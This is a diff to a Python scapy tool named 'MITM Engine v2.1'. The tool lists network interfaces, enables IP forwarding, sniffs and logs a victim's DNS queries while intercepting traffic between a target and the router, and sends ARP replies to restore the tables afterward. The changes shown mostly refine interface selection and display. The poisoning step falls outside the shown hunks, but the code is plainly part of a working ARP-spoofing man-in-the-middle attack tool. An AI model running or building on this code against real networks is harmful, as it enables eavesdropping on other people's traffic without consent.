@@ -11,7 +11,7 @@ console = Console()
 def get_interfaces():
     """
     Filters for primary physical interfaces (Wi-Fi and Ethernet).
-    Targets: wlan, wl (Linux), en (macOS/Ethernet), and eth.
+    Targets: wlan, wl (Linux), en (macOS).
     """
     all_ifaces = conf.ifaces.data.values()
     filtered = []
@@ -19,17 +19,16 @@ def get_interfaces():
     # Common prefixes for physical hardware
     physical_prefixes = ('wlan', 'wl', 'en', 'eth')
     # Interfaces to ignore (virtual/internal)
-    ignore_list = ('lo', 'utun', 'gif', 'stf', 'bridge', 'anpi', 'awdl', 'llw')
+    ignore_prefixes = ('lo', 'utun', 'gif', 'stf', 'bridge', 'anpi', 'awdl', 'llw')
 
     for iface in all_ifaces:
         name = iface.name.lower()
-        # Ensure it starts with a physical prefix and isn't in the ignore list
-        if name.startswith(physical_prefixes) and not name.startswith(ignore_list):
-            # Only add if it has an IP address (is active)
-            if iface.ip != "127.0.0.1" and iface.ip != "0.0.0.0":
+        if name.startswith(physical_prefixes) and not name.startswith(ignore_prefixes):
+            # Only include interfaces with an active IP
+            if iface.ip != "127.0.0.1" and iface.ip != "0.0.0.0" and iface.ip is not None:
                 filtered.append(iface.name)
                 
-    return filtered
+    return sorted(filtered)
 
 def toggle_forwarding(state=True):
     """Enables or disables IP forwarding on the host OS."""
@@ -65,21 +64,22 @@ def packet_callback(packet):
             console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} queried a domain.")
 
 def start_mitm():
-    draw_header("MITM Engine v2.1 (Filtered WLAN)")
+    draw_header("MITM Engine v2.1 (Multi-Interface Support)")
     
-    # 1. Interface Selection with filtering
+    # 1. Interface Selection Logic
     ifaces = get_interfaces()
     if not ifaces:
         console.print("[red][!] No active physical interfaces found.[/red]")
         return
 
-    table = Table(title="Primary Network Interfaces", border_style="cyan")
+    table = Table(title="Available Network Interfaces", border_style="cyan")
     table.add_column("ID", style="bold")
     table.add_column("Interface", style="white")
-    table.add_column("Status", style="dim")
+    table.add_column("IP Address", style="dim")
     
     for i, name in enumerate(ifaces):
-        table.add_row(str(i), name, "[green]ACTIVE[/green]")
+        ip = conf.ifaces.dev_from_name(name).ip
+        table.add_row(str(i), name, ip)
     
     console.print(table)
     try:
@@ -106,6 +106,7 @@ def start_mitm():
     console.print(f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
     
     stop_event = threading.Event()
+    # Sniffing must be explicitly locked to the chosen interface for WLAN
     sniff_thread = threading.Thread(target=lambda: sniff(iface=chosen_iface, prn=packet_callback, store=0, stop_filter=lambda p: stop_event.is_set()))
     sniff_thread.start()
 
@@ -125,7 +126,7 @@ def start_mitm():
         console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
         toggle_forwarding(False)
         
-        # Clean Restoration
+        # Proper restoration using targeted Layer 2 frames
         res_target = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router, hwsrc=r_mac)
         res_router = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target, hwsrc=t_mac)
         
